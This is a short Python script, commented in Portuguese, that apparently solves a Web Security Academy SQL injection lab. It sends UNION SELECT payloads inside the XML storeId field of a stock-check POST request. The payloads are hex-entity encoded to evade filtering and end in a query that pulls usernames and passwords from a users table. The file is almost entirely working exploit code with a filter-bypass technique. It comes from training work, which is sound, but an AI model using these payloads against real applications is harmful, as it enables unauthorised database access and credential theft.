import requests

# Parâmetro vulnerável: Entradas XML no método POST em .../product/stock

# Função para codificação em hex_entites
def encode_hex_entites(text_to_encode):
    text_encoded = "".join(f"&#x{ord(c):02x};" for c in text_to_encode)
    return text_encoded

# PAYLOADS
sqli_1 = " UNION SELECT NULL" # OK
sqli_2 = " UNION SELECT NULL,NULL" # ERRO. Tabela da consulta original só tem 1 coluna 
sqli_3 = " UNION SELECT username FROM users"
sqli_4 = " UNION SELECT username||' -> '||password FROM users" 

# HTTP request
url = "https://0a3400660386bc44806a0d3e004f000c.web-security-academy.net/product/stock"
xml = """
<?xml version = "1.0" encoding = "UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1""" + encode_hex_entites(sqli_4) + """</storeId>
</stockCheck>
"""
headers = {
    'Content-Type': 'application/xml'
}
response = requests.post(url, data=xml, headers=headers)

print(response.text)